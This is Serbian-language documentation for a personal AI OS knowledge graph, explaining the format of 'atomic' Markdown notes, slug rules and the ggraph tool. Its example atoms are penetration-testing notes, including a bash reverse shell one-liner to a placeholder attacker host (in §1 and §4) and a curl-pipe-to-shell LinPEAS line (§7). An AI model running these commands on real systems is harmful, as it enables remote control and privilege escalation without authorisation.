# Atomic Content — kako praviti atome koje AI OS koristi

Ovo je uputstvo kako da napraviš **atomski fajl** (jedan fajl = jedna činjenica /
entitet) u formatu koji ceo AI OS ume da pročita i iskoristi: globalni graf
(`ggraph` / `GlobalGraphManager`), centralni ruter (graf-keš), ćelijski RAG
(fallthrough → „naučeni" atomi) i vizuelni **Second Brain** (Memory orbita).

Pravilo broj 1: **jedan atom = jedan pojam.** Kratko, samostalno, povezano
`[[linkovima]]` sa srodnima. Bolje 10 malih atoma nego jedan dugačak dokument.

---

## 1. Oblik atoma (Markdown + YAML frontmatter)

```markdown
---
id: reverse-shell-bash
title: Reverse shell (bash one-liner)
type: note
tags: [pentest, shell, kalima]
created: 2026-09-18T10:00:00Z
updated: 2026-09-18T10:00:00Z
---

Kratko telo u Markdown-u. Objašnjenje, komanda, primer:

    bash -i >& /dev/tcp/NAPADAC/PORT 0>&1

Povezano: [[listener-nc]], [[target-10-10-10-5]]
```

- **Frontmatter** je između dve linije `---`. Prosti `ključ: vrednost` i liste
  (`[a, b]` ili YAML lista sa `-`). Bez ugnježdenih mapa (parser je namerno prost).
- **Telo** je običan Markdown. `[[naziv]]` su unutrašnji linkovi ka drugim atomima
  (naziv = `id` cilja); iz njih se gradi graf (veze i backlink-ovi).

### Polja frontmatter-a
| Polje | Obavezno | Opis |
|------|----------|------|
| `id` | da* | Jedinstveni slug = ime fajla bez `.md`. Vidi pravilo o slug-u niže. |
| `title` | da | Ljudski naslov (iz njega se izvodi `id` ako ga ne zadaš). |
| `type` | da | Tip entiteta (vidi listu). Slobodan string, ali koristi standardne. |
| `tags` | ne | Lista oznaka za pretragu/filter. |
| `aliases` | ne | Alternativni nazivi (za pretragu). |
| `created`/`updated` | ne | ISO-8601 vreme; `ggraph` ih postavlja sam. |
| `domain` | ne | Domen vlasnik (`kalima`, `codium`…) — za per-domen atome. |
| `source` | ne | Odakle je došao (npr. `router`, `nuclei`, `ručno`). |

\* Ako praviš atom preko `ggraph`, `id` se generiše automatski iz `title`.

### Standardni `type` (proširivo)
`meta` (host/domen mete) · `ip` · `youtube-script` · `film` · `note` (generičko) ·
plus semantički: `code`, `recon`, `orchestration`, `skill`, `log`, `cve`, `target`.

---

## 2. Zlatno pravilo o `id` (slug)

`id` MORA biti *slug* naslova, jer ruter traži atom po `slugify(upit)` u
graf-kešu. Slug se pravi ovako (isto u JS i Python delu sistema):

1. Unicode NFKD + ukloni akcente (č→c, ž→z, š→s; **đ ostaje separator**).
2. mala slova; sve što nije `[a-z0-9]` → `-`; skini vodeće/prateće `-`; max 80.

Primeri: `Reverse shell?` → `reverse-shell` · `Meta 10.10.10.5` → `meta-10-10-10-5`.
Ako `id` ne odgovara slug-u naslova, ruter neće naći atom (graf-keš promašaj).

---

## 3. Gde atomi žive

- **Globalni graf (deljeno, ceo OS):**
  `~/ai/core-infrastructure/vector-dbs/global_graph_vault/<id>.md`
  Ovo čita centralni ruter (graf-keš) i `ggraph`. Ovde idu činjenice korisne
  više domena (mete, IP-jevi, skripte, opšte beleške).
- **Po domenu (lokalni RAG ćelije):** `~/ai/domains/<domen>/.ai/atomi/`
  - `nauceno/<id>.md` — ono što je domen naučio preko fallthrough-a (auto-upis).
  - `personas/…` — persona/alati/komande agenta (poseban, uređiv iz GUI-ja).

---

## 4. Kako da napraviš atom

### A) Preko `ggraph` (preporučeno za globalni graf)
```bash
ggraph add <type> "<naslov>" -b "<telo>" -t tag1,tag2      # napravi/izmeni
ggraph add note "Reverse shell (bash)" -b "bash -i >& /dev/tcp/IP/PORT 0>&1" -t pentest,shell
ggraph get reverse-shell-bash        # pročitaj (JSON: frontmatter + body + links)
ggraph list --type meta              # izlistaj po tipu
ggraph link meta-10-10-10-5 reverse-shell-bash   # poveži dva atoma
ggraph backlinks reverse-shell-bash  # ko pokazuje na ovaj atom
```
`ggraph add` sam postavlja `id` (slug naslova), `created`/`updated` i format.
Ponovni `add` sa istim naslovom = ažurira postojeći atom (čuva `created`).

### B) Ručno (fajl direktno)
Napravi `<id>.md` u odgovarajućem folderu (gore) po šablonu iz §1. Pazi da `id`
u frontmatter-u = ime fajla = slug naslova.

---

## 5. Kako AI to koristi (zašto format mora biti ovakav)

- **Ćelijski RAG (fallthrough):** kad domen nema odgovor lokalno, pita ruter; ono
  što dobije upiše kao atom u `nauceno/` (i best-effort u globalni graf), pa
  sledeći put zna odmah. Vidi `core/cell/fallthrough.py`.
- **Centralni ruter (graf-keš):** pre prosleđivanja proverava globalni graf po
  `slugify(upit)` — ako atom postoji, vraća ga bez pitanja drugih domena.
- **Second Brain (GUI):** atomi po domenu su **Memory** orbita; `[[linkovi]]`
  postaju relacione linije. Dobro imenovani/povezani atomi = čitljiv graf.
- **Pretraga:** naslov, `tags` i telo se pretražuju; zato drži naslov jasan i
  dodaj `tags`.

---

## 6. Dobra praksa (Do / Don't)

**Do:** jedan pojam po atomu · jasan `title` · `type` iz standardne liste ·
poveži `[[srodne]]` atome · dodaj `tags` · komande/primeri u telo.

**Don't:** ne trpaj više tema u jedan atom · ne stavljaj `id` koji ne odgovara
slug-u naslova · ne koristi ugnježden YAML · ne pravi ogromne fajlove (radije
razbij + poveži).

---

## 7. Brzi šabloni

**Meta (host):**
```markdown
---
id: meta-10-10-10-5
title: Meta 10.10.10.5
type: meta
tags: [target, htb]
---
Otvoreni portovi: 22, 80, 445. OS: Linux. [[ip-10-10-10-5]]
```

**Skripta/kod:**
```markdown
---
id: linpeas-quick
title: LinPEAS brzo pokretanje
type: code
tags: [privesc, linux]
---
    curl -L https://.../linpeas.sh | sh
Povezano: [[privesc-linux-checklist]]
```

**Beleška:**
```markdown
---
id: nmap-cheatsheet
title: Nmap cheatsheet
type: note
tags: [recon, nmap]
---
`nmap -sC -sV -oN skan.txt <IP>` — default skripte + verzije.
```
